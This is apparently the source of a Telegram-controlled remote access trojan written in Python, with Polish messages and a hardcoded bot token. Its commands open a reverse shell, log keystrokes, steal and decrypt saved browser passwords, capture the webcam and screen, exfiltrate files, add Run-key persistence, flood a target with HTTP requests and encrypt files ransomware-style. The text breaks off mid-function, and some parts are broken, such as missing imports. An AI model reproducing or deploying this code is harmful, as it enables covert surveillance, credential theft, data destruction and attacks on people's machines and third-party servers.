import os
import sys
import time
import threading
import subprocess
import platform
import pyautogui
import keyboard
import psutil
import pyperclip
import requests
import json
import re
import winreg
import shutil
import sqlite3
import base64
import cv2
import numpy as np
from datetime import datetime
from urllib.request import urlopen
from urllib.parse import urlparse
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, CallbackContext
import socket
import tkinter as tk
from tkinter import ttk, filedialog
from cryptography.fernet import Fernet
import hashlib
import webbrowser
import winsound
import win32gui
import win32con
import win32api
import win32process
from PIL import Image, ImageTk
import webbrowser
import urllib.parse
import tempfile
import zipfile
import hashlib
import random
import string

# Konfiguracja - Twoje dane!
TELEGRAM_TOKEN = "8427740659:AAEWjm2pwuKy19RIWWfFASea-a7sMgGc0xo"
ADMIN_ID = 7360950718

class RemoteControlBot:
    def __init__(self):
        self.keylogger_active = False
        self.keylog_data = []
        self.scheduled_tasks = {}
        self.file_grab_active = False
        self.password_stealer_active = False
        self.persistence_active = False
        self.anti_vm_active = False
        self.shell_active = False
        self.clipboard_monitor_active = False
        self.clipboard_data = []
        self.process_monitor_active = False
        self.file_monitor_active = False
        self.file_monitor_paths = []
        self.bot_instance = None
        self.telegram_files = {}
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.active_webcams = []
        self.monitoring_processes = []
        self.blocked_urls = []
        self.system_lock_active = False
        self.screen_capture_active = False
        self.screen_capture_thread = None

    def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Unknown"

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "Unknown"

    def get_current_time(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def get_system_info(self):
        """Get detailed system information"""
        try:
            info = {
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "hostname": socket.gethostname(),
                "ip_address": self.get_local_ip(),
                "public_ip": self.get_public_ip(),
                "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
                "processor": platform.processor(),
                "ram": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
                "cpu_count": psutil.cpu_count(),
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            }
            return info
        except Exception as e:
            return {"error": str(e)}

    async def send_startup_notification(self):
        try:
            public_ip = self.get_public_ip()
            local_ip = self.get_local_ip()
            current_time = self.get_current_time()
            system_info = self.get_system_info()
            
            message = f"""💻 MyComputer Status
🌐 Public IP: {public_ip}
🏠 Local IP: {local_ip}
🕒 Time: {current_time}
🖥️ Platform: {system_info.get('platform', 'Unknown')} {system_info.get('platform_release', 'Unknown')}
💾 RAM: {system_info.get('ram', 'Unknown')}
🔧 CPU Cores: {system_info.get('cpu_count', 'Unknown')}
⏰ Boot Time: {system_info.get('boot_time', 'Unknown')}"""
            await self.bot_instance.send_message(chat_id=ADMIN_ID, text=message)
        except Exception as e:
            print(f"Error sending startup notification: {e}")

    def setup_application(self):
        application = Application.builder().token(TELEGRAM_TOKEN).build()
        self.bot_instance = application.bot
        application.add_handler(CommandHandler("start", self.start))
        application.add_handler(CommandHandler("help", self.help))
        application.add_handler(CommandHandler("reverse", self.reverse_shell))
        application.add_handler(CommandHandler("put", self.put_file))
        application.add_handler(CommandHandler("get", self.get_file))
        from telegram.ext import MessageHandler, filters
        application.add_handler(MessageHandler(filters.Document.ALL, self.handle_telegram_file))
        application.add_handler(CommandHandler("run", self.run_code))
        application.add_handler(CommandHandler("screenshot", self.screenshot))
        application.add_handler(CommandHandler("keylogger", self.keylogger))
        application.add_handler(CommandHandler("dos", self.dos_attack))
        application.add_handler(CommandHandler("schedule", self.schedule_task))
        application.add_handler(CommandHandler("stop", self.stop_bot))
        application.add_handler(CommandHandler("custom", self.run_custom))
        application.add_handler(CommandHandler("grab", self.file_grab))
        application.add_handler(CommandHandler("steal", self.password_stealer))
        application.add_handler(CommandHandler("persist", self.persistence))
        application.add_handler(CommandHandler("antivm", self.anti_vm))
        application.add_handler(CommandHandler("shell", self.shell))
        application.add_handler(CommandHandler("browse", self.browse))
        application.add_handler(CommandHandler("jumpscare", self.jumpscare))
        application.add_handler(CommandHandler("show", self.show))
        application.add_handler(CommandHandler("sysinfo", self.system_info))
        application.add_handler(CommandHandler("processes", self.list_processes))
        application.add_handler(CommandHandler("kill", self.kill_process))
        application.add_handler(CommandHandler("webcam", self.webcam_capture))
        application.add_handler(CommandHandler("record_screen", self.screen_recording))
        application.add_handler(CommandHandler("lock", self.lock_system))
        application.add_handler(CommandHandler("unlock", self.unlock_system))
        application.add_handler(CommandHandler("block", self.block_url))
        application.add_handler(CommandHandler("unblock", self.unblock_url))
        application.add_handler(CommandHandler("encrypt", self.encrypt_files))
        application.add_handler(CommandHandler("decrypt", self.decrypt_files))
        application.add_handler(CommandHandler("message", self.display_message))
        application.add_handler(CommandHandler("sound", self.play_sound))
        application.add_handler(CommandHandler("bluetooth", self.bluetooth_control))
        application.add_handler(CommandHandler("network", self.network_scan))
        application.add_handler(CommandHandler("geolocate", self.geolocate))
        application.run_polling()

    async def start(self, update: Update, context: CallbackContext):
        await self.send_startup_notification()
        await update.message.reply_text("Bot kontroli zdalnej włączony\nUżyj /help aby zobaczyć dostępne komendy")

    async def help(self, update: Update, context: CallbackContext):
        help_text = """
        Dostępne komendy:
        /reverse <host> <port> - Odwrotna powłoka
        /put <ścieżka_pliku> - Prześlij plik do bota
        /get <nazwa_pliku> - Pobierz plik z bota
        /run <kod_python> - Wykonaj kod Python
        /screenshot - Zrób zrzut ekranu
        /keylogger <start/stop> - Kontroluj keylogger
        /dos <cel> <port> <czas> - Atak DoS
        /schedule <komenda> <czas> - Zaplanuj zadanie
        /stop - Zatrzymaj bota
        /jumpscare [czas] - Wyświetl jumpscare na ekranie
        /show <nazwa_pliku> - Wyświetl obraz, GIF lub wideo na ekranie
        /grab <ścieżka_docelowa> - Przechwyć pliki z komputera
        /steal - Zdobądź hasła z przeglądarki
        /persist - Dodaj bota do autostartu
        /antivm - Sprawdź, czy środowisko jest bezpieczne
        /shell <komenda> - Wykonaj polecenie w terminalu
        /browse <ścieżka> - Przeglądaj pliki i foldery na komputerze
        /sysinfo - Informacje o systemie
        /processes - Lista procesów
        /kill <PID> - Zakończ proces
        /webcam - Zrób zdjęcie z kamery
        /record_screen - Nagrywaj ekran
        /lock - Zablokuj system
        /unlock - Odblokuj system
        /block <url> - Zablokuj URL
        /unblock <url> - Odblokuj URL
        /encrypt <ścieżka> - Szyfruj pliki
        /decrypt <ścieżka> - Deszyfruj pliki
        /message <tekst> - Wyświetl komunikat
        /sound <dźwięk> - Odtwórz dźwięk
        /bluetooth - Sterowanie Bluetooth
        /network - Skanuj sieć
        /geolocate - Lokalizacja GPS
        """
        await update.message.reply_text(help_text)

    async def system_info(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            info = self.get_system_info()
            info_text = "System Information:\n"
            for key, value in info.items():
                info_text += f"{key}: {value}\n"
            await update.message.reply_text(info_text)
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def list_processes(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            # Sort by CPU usage
            processes.sort(key=lambda x: x['cpu_percent'] if x['cpu_percent'] else 0, reverse=True)
            
            response = "Running Processes (Top 20 by CPU):\n"
            for i, proc in enumerate(processes[:20]):
                response += f"PID: {proc['pid']}, Name: {proc['name']}, CPU: {proc['cpu_percent']:.1f}%\n"
            
            await update.message.reply_text(response)
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def kill_process(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            pid = int(context.args[0])
            p = psutil.Process(pid)
            p.terminate()
            await update.message.reply_text(f"Proces {pid} został zakończony.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def webcam_capture(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                temp_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
                cv2.imwrite(temp_path, frame)
                await update.message.reply_photo(open(temp_path, 'rb'))
                os.remove(temp_path)
            cap.release()
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def screen_recording(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            duration = int(context.args[0]) if context.args else 10
            await update.message.reply_text(f"Rozpoczynam nagrywanie ekranu na {duration} sekund...")
            
            frames = []
            for i in range(duration):
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                frames.append(frame)
                time.sleep(1)
            
            height, width, layers = frames[0].shape
            temp_path = os.path.join(tempfile.gettempdir(), "screen_recording.avi")
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            video = cv2.VideoWriter(temp_path, fourcc, 1.0, (width, height))
            
            for frame in frames:
                video.write(frame)
            
            video.release()
            await update.message.reply_video(open(temp_path, 'rb'))
            os.remove(temp_path)
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def lock_system(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            self.system_lock_active = True
            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"])
            await update.message.reply_text("System został zablokowany.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def unlock_system(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            self.system_lock_active = False
            await update.message.reply_text("System został odblokowany.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def block_url(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            url = context.args[0]
            self.blocked_urls.append(url)
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            with open(hosts_path, "a") as hosts_file:
                hosts_file.write(f"127.0.0.1 {url}\n")
            await update.message.reply_text(f"URL {url} został zablokowany.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def unblock_url(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            url = context.args[0]
            if url in self.blocked_urls:
                self.blocked_urls.remove(url)
                hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
                with open(hosts_path, "r") as hosts_file:
                    lines = hosts_file.readlines()
                with open(hosts_path, "w") as hosts_file:
                    for line in lines:
                        if url not in line:
                            hosts_file.write(line)
                await update.message.reply_text(f"URL {url} został odblokowany.")
            else:
                await update.message.reply_text(f"URL {url} nie był zablokowany.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def encrypt_files(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            path = context.args[0] if context.args else "."
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, "rb") as f:
                        data = f.read()
                    encrypted_data = self.cipher_suite.encrypt(data)
                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
            await update.message.reply_text(f"Pliki w {path} zostały zaszyfrowane.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def decrypt_files(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            path = context.args[0] if context.args else "."
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f:
                            data = f.read()
                        decrypted_data = self.cipher_suite.decrypt(data)
                        with open(file_path, "wb") as f:
                            f.write(decrypted_data)
                    except:
                        pass  # If decryption fails, skip the file
            await update.message.reply_text(f"Pliki w {path} zostały odszyfrowane.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def display_message(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            message = ' '.join(context.args)
            def show_message():
                root = tk.Tk()
                root.title("Message")
                root.geometry("400x200")
                root.configure(bg='red')
                label = tk.Label(root, text=message, font=("Arial", 16), fg="white", bg="red")
                label.pack(expand=True)
                root.attributes('-topmost', True)
                root.mainloop()
            threading.Thread(target=show_message, daemon=True).start()
            await update.message.reply_text(f"Wiadomość '{message}' została wyświetlona.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def play_sound(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            # Play a system sound
            winsound.Beep(1000, 1000)  # Frequency 1000Hz, Duration 1000ms
            await update.message.reply_text("Dźwięk został odtworzony.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def bluetooth_control(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            # This is a placeholder - actual Bluetooth control would require additional libraries
            await update.message.reply_text("Kontrola Bluetooth nie jest jeszcze zaimplementowana.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def network_scan(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            # Simple network scan using ping
            import subprocess
            import ipaddress
            
            # Get local network
            local_ip = self.get_local_ip()
            network = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
            
            active_hosts = []
            for i in range(1, 255):
                ip = '.'.join(local_ip.split('.')[:-1]) + f'.{i}'
                result = subprocess.run(['ping', '-n', '1', '-w', '1000', ip], 
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if result.returncode == 0:
                    active_hosts.append(ip)
            
            response = f"Active hosts on network {network}:\n"
            for host in active_hosts:
                response += f"- {host}\n"
            
            await update.message.reply_text(response)
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def geolocate(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            # Get location based on IP
            public_ip = self.get_public_ip()
            if public_ip != "Unknown":
                response = requests.get(f"http://ip-api.com/json/{public_ip}")
                location_data = response.json()
                
                if location_data.get("status") == "success":
                    location_info = f"""
Lokalizacja:
Kraj: {location_data.get("country", "N/A")}
Region: {location_data.get("regionName", "N/A")}
Miasto: {location_data.get("city", "N/A")}
Szerokość geograficzna: {location_data.get("lat", "N/A")}
Długość geograficzna: {location_data.get("lon", "N/A")}
ISP: {location_data.get("isp", "N/A")}
"""
                    await update.message.reply_text(location_info)
                else:
                    await update.message.reply_text("Nie udało się uzyskać lokalizacji.")
            else:
                await update.message.reply_text("Nie udało się uzyskać lokalizacji.")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def reverse_shell(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            host = context.args[0]
            port = int(context.args[1])
            threading.Thread(target=self._reverse_shell, args=(host, port)).start()
            await update.message.reply_text(f"Odwrotna powłoka uruchomiona na {host}:{port}")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    def _reverse_shell(self, host, port):
        import socket
        import subprocess
        import os
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        for fd in (0, 1, 2):
            os.dup2(s.fileno(), fd)
        subprocess.call(["/bin/sh", "-i"])

    async def put_file(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        file_path = context.args[0]
        try:
            with open(file_path, 'rb') as f:
                await update.message.reply_document(f)
            await update.message.reply_text("Plik został pomyślnie przesłany")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def get_file(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        file_name = context.args[0]
        try:
            with open(file_name, 'rb') as f:
                await update.message.reply_document(f)
            await update.message.reply_text("Plik został pomyślnie pobrany")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def run_code(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        code = ' '.join(context.args)
        try:
            result = str(eval(code))
            await update.message.reply_text(f"Wynik:\n{result}")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def screenshot(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            img = pyautogui.screenshot()
            img.save("screenshot.png")
            await update.message.reply_photo(open("screenshot.png", 'rb'))
            os.remove("screenshot.png")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def keylogger(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        action = context.args[0] if context.args else ""
        if action == "start":
            if not self.keylogger_active:
                self.keylogger_active = True
                keyboard.hook(self._log_key)
                await update.message.reply_text("Keylogger uruchomiony")
            else:
                await update.message.reply_text("Keylogger już działa")
        elif action == "stop":
            if self.keylogger_active:
                self.keylogger_active = False
                keyboard.unhook_all()
                with open("keylog.txt", "w") as f:
                    f.write('\n'.join(self.keylog_data))
                await update.message.reply_document(open("keylog.txt", "rb"))
                os.remove("keylog.txt")
                self.keylog_data = []
                await update.message.reply_text("Keylogger zatrzymany, dane wysłane")
            else:
                await update.message.reply_text("Keylogger nie działa")
        else:
            await update.message.reply_text("Użycie: /keylogger <start/stop>")

    def _log_key(self, event):
        if self.keylogger_active:
            self.keylog_data.append(f"{time.ctime()}: {event.name}")

    async def dos_attack(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            target = context.args[0]
            port = int(context.args[1])
            duration = int(context.args[2])
            for i in range(10):
                threading.Thread(target=self._dos_attack, args=(target, port, duration)).start()
            await update.message.reply_text(f"Atak DoS uruchomiony na {target}:{port} przez {duration} sekund z 10 wątkami")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    def _dos_attack(self, target, port, duration):
        import socket
        import random
        from time import time
        start_time = time()
        while time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target, port))
                for _ in range(5):
                    user_agent = random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                    ])
                    request = f"GET /?{random.randint(1, 1000)} HTTP/1.1\r\n"
                    request += f"Host: {target}\r\n"
                    request += f"User-Agent: {user_agent}\r\n"
                    request += "Accept: */*\r\n"
                    request += "Connection: keep-alive\r\n\r\n"
                    s.send(request.encode('ascii'))
                s.close()
            except:
                try:
                    s.close()
                except:
                    pass

    async def schedule_task(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            command = context.args[0]
            delay = int(context.args[1])
            task_id = len(self.scheduled_tasks) + 1
            self.scheduled_tasks[task_id] = (command, time.time() + delay)
            threading.Timer(delay, self._execute_scheduled_task, args=(command,)).start()
            await update.message.reply_text(f"Zadanie zaplanowane: {command} za {delay} sekund")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    def _execute_scheduled_task(self, command):
        try:
            if command == "screenshot":
                pyautogui.screenshot().save("screenshot.png")
            elif command.startswith("reverse"):
                host, port = command.split()[1], int(command.split()[2])
                self._reverse_shell(host, port)
        except Exception as e:
            print(f"Błąd zaplanowanego zadania: {str(e)}")

    async def run_custom(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        script_name = context.args[0]
        try:
            script_path = os.path.join("scripts", f"{script_name}.py")
            with open(script_path) as f:
                code = f.read()
            exec(code, globals())
            await update.message.reply_text(f"Skrypt niestandardowy {script_name} wykonany")
        except Exception as e:
            await update.message.reply_text(f"Błąd: {str(e)}")

    async def file_grab(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        if not context.args:
            await update.message.reply_text("Użycie: /grab <ścieżka_do_pliku>")
            return
        file_path = context.args[0]
        common_paths = [
            file_path,
            os.path.join(os.path.expanduser("~"), file_path),
            os.path.join(os.path.expanduser("~"), "Desktop", file_path),
            os.path.join(os.path.expanduser("~"), "Documents", file_path),
            os.path.join(os.path.expanduser("~"), "Downloads", file_path)
        ]
        found = False
        for path in common_paths:
            if os.path.exists(path):
                file_path = path
                found = True
                break
        if not found:
            await update.message.reply_text(f"Nie znaleziono pliku: {file_path}")
            return
        try:
            file_size = os.path.getsize(file_path)
            if file_size > 50 * 1024 * 1024:
                await update.message.reply_text(f"Plik jest za duży do wysłania ({file_size} bajtów). Maksymalny rozmiar: 50MB")
                return
            with open(file_path, 'rb') as f:
                await update.message.reply_document(f)
            await update.message.reply_text(f"Plik '{os.path.basename(file_path)}' został wysłany.")
        except Exception as e:
            await update.message.reply_text(f"Błąd wysyłania pliku: {str(e)}")

    async def password_stealer(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            await update.message.reply_text("Rozpoczynam kradzież haseł...")
            passwords = self._steal_passwords()
            if passwords:
                with open("passwords.txt", "w", encoding='utf-8') as f:
                    for url, password in passwords:
                        f.write(f"{url}: {password}\n")
                await update.message.reply_document(open("passwords.txt", "rb"))
                os.remove("passwords.txt")
                await update.message.reply_text(f"Zdobądźiono {len(passwords)} haseł.")
            else:
                browsers = {
                    "Chrome": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
                    "Firefox": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles"),
                    "Edge": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
                    "Opera": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Stable")
                }
                browsers_found = [b for b, p in browsers.items() if os.path.exists(p)]
                if browsers_found:
                    await update.message.reply_text("Nie znaleziono żadnych haseł. Znaleziono następujące przeglądarki: " + ", ".join(browsers_found))
                else:
                    await update.message.reply_text("Nie znaleziono żadnych przeglądarek z zapisanymi hasłami.")
        except Exception as e:
            await update.message.reply_text(f"Błąd kradzieży haseł: {str(e)}")

    def _steal_passwords(self):
        passwords = []
        browsers = {
            "Chrome": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
            "Firefox": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles"),
            "Edge": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
            "Opera": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Stable")
        }
        for browser, path in browsers.items():
            if os.path.exists(path):
                if browser in ["Chrome", "Edge"]:
                    profiles = []
                    default_path = os.path.join(path, "Default")
                    if os.path.exists(default_path):
                        profiles.append(default_path)
                    for item in os.listdir(path):
                        item_path = os.path.join(path, item)
                        if os.path.isdir(item_path) and item.startswith("Profile"):
                            profiles.append(item_path)
                    for profile_path in profiles:
                        passwords.extend(self._parse_browser_passwords(browser, profile_path))
                else:
                    passwords.extend(self._parse_browser_passwords(browser, path))
        return passwords

    def _parse_browser_passwords(self, browser, path):
        passwords = []
        try:
            if browser in ["Chrome", "Edge", "Opera"]:
                login_data_path = os.path.join(path, "Login Data")
                if not os.path.exists(login_data_path):
                    return passwords
                temp_path = login_data_path + "_temp"
                shutil.copyfile(login_data_path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                credential_data = cursor.fetchall()
                conn.close()
                os.remove(temp_path)
                for url, username, encrypted_password in credential_data:
                    decrypted_password = self._decrypt_chrome_password(encrypted_password)
                    if decrypted_password:
                        passwords.append((url, decrypted_password))
                    elif username:
                        passwords.append((url, f"Username: {username} (password decryption failed)"))
            elif browser == "Firefox":
                passwords.extend(self._extract_firefox_passwords(path))
        except:
            pass
        return passwords

    def _decrypt_chrome_password(self, encrypted_password):
        try:
            if len(encrypted_password) > 3 and (encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11'):
                return self._decrypt_chrome_password_aes(encrypted_password)
            import ctypes
            import ctypes.wintypes as wintypes
            from ctypes import Structure, c_void_p, create_string_buffer
            class DATA_BLOB(Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", c_void_p)]
            crypt32 = ctypes.windll.crypt32
            encrypted_buffer = create_string_buffer(encrypted_password)
            encrypted_blob = DATA_BLOB(len(encrypted_password), ctypes.cast(encrypted_buffer, c_void_p))
            decrypted_blob = DATA_BLOB()
            if crypt32.CryptUnprotectData(ctypes.byref(encrypted_blob), None, None, None, None, 0, ctypes.byref(decrypted_blob)):
                decrypted_data = ctypes.string_at(decrypted_blob.pbData, decrypted_blob.cbData)
                crypt32.LocalFree(decrypted_blob.pbData)
                return decrypted_data.decode('utf-8')
        except:
            pass
        return None

    def _decrypt_chrome_password_aes(self, encrypted_password):
        try:
            if len(encrypted_password) < 19:
                return None
            prefix = encrypted_password[:3]
            if prefix not in [b'v10', b'v11', b'v20']:
                return None
            nonce = encrypted_password[3:15]
            ciphertext_and_tag = encrypted_password[15:]
            key = self._get_chrome_aes_key()
            if key is None:
                return None
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            decrypted_password = aesgcm.decrypt(nonce, ciphertext_and_tag, None)
            return decrypted_password.decode('utf-8')
        except:
            pass
        return None

    def _get_chrome_aes_key(self):
        try:
            local_state_path = os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State")
            if not os.path.exists(local_state_path):
                return None
            with open(local_state_path, 'r') as f:
                local_state = json.load(f)
            encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key")
            if not encrypted_key:
                return None
            encrypted_key = base64.b64decode(encrypted_key)[5:]
            import ctypes
            import ctypes.wintypes as wintypes
            class DATA_BLOB(Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", c_void_p)]
            crypt32 = ctypes.windll.crypt32
            encrypted_buffer = create_string_buffer(encrypted_key)
            encrypted_blob = DATA_BLOB(len(encrypted_key), ctypes.cast(encrypted_buffer, c_void_p))
            decrypted_blob = DATA_BLOB()
            if crypt32.CryptUnprotectData(ctypes.byref(encrypted_blob), None, None, None, None, 0, ctypes.byref(decrypted_blob)):
                decrypted_key = ctypes.string_at(decrypted_blob.pbData, decrypted_blob.cbData)
                ctypes.windll.kernel32.LocalFree(decrypted_blob.pbData)
                return decrypted_key
        except:
            pass
        return None

    def _extract_firefox_passwords(self, profiles_path):
        passwords = []
        try:
            for profile in os.listdir(profiles_path):
                profile_path = os.path.join(profiles_path, profile)
                if not os.path.isdir(profile_path):
                    continue
                logins_json = os.path.join(profile_path, "logins.json")
                signons_db = os.path.join(profile_path, "signons.sqlite")
                if os.path.exists(logins_json):
                    with open(logins_json, 'r') as f:
                        logins_data = json.load(f)
                    for login in logins_data.get("logins", []):
                        url = login.get("hostname", "")
                        username = login.get("username", "")
                        passwords.append((url, f"Username: {username} (password encrypted)"))
                elif os.path.exists(signons_db):
                    conn = sqlite3.connect(signons_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT hostname FROM moz_logins")
                    for row in cursor.fetchall():
                        passwords.append((row[0], "Username and password encrypted (requires NSS)"))
                    conn.close()
        except:
            pass
        return passwords

    async def persistence(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            await update.message.reply_text("Dodaję bota do autostartu...")
            self._add_to_startup()
            await update.message.reply_text("Bot został dodany do autostartu.")
        except Exception as e:
            await update.message.reply_text(f"Błąd dodawania do autostartu: {str(e)}")

    def _add_to_startup(self):
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0) as key:
                winreg.SetValueEx(key, "RemoteControlBot", 0, winreg.REG_SZ, sys.executable)
        except:
            pass

    async def anti_vm(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        is_vm = self._check_if_vm()
        if is_vm:
            await update.message.reply_text("Środowisko jest wirtualne (VM), bezpieczne do użycia.")
        else:
            await update.message.reply_text("Środowisko jest prawdziwe (nie-VM). Możliwe wykrycie.")

    def _check_if_vm(self):
        checks = ["vmware", "vbox", "qemu", "xen", "virtualbox"]
        try:
            for proc in os.listdir('/proc'):
                if proc.isdigit():
                    with open(f'/proc/{proc}/cmdline', 'r') as f:
                        if any(check in f.read().lower() for check in checks):
                            return True
        except:
            pass
        return False

    async def shell(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        command = ' '.join(context.args)
        if not command:
            await update.message.reply_text("Podaj polecenie do wykonania.")
            return
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
            output = result.stdout + result.stderr
            if output.strip():
                await update.message.reply_text(f"```\n{output}\n```")
            else:
                await update.message.reply_text("Polecenie wykonane, brak wyniku.")
        except Exception as e:
            await update.message.reply_text(f"Błąd wykonania polecenia: {str(e)}")

    async def browse(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        path = "C:\\" if not context.args else context.args[0]
        try:
            if not os.path.exists(path):
                await update.message.reply_text(f"Ścieżka nie istnieje: {path}")
                return
            if os.path.isfile(path):
                file_size = os.path.getsize(path)
                if file_size > 50 * 1024 * 1024:
                    await update.message.reply_text(f"Plik jest za duży do wysłania ({file_size} bajtów). Maksymalny rozmiar: 50MB")
                    return
                with open(path, 'rb') as f:
                    await update.message.reply_document(f)
                await update.message.reply_text(f"Wysłano plik: {path}")
                return
            if os.path.isdir(path):
                items = []
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    if os.path.isdir(item_path):
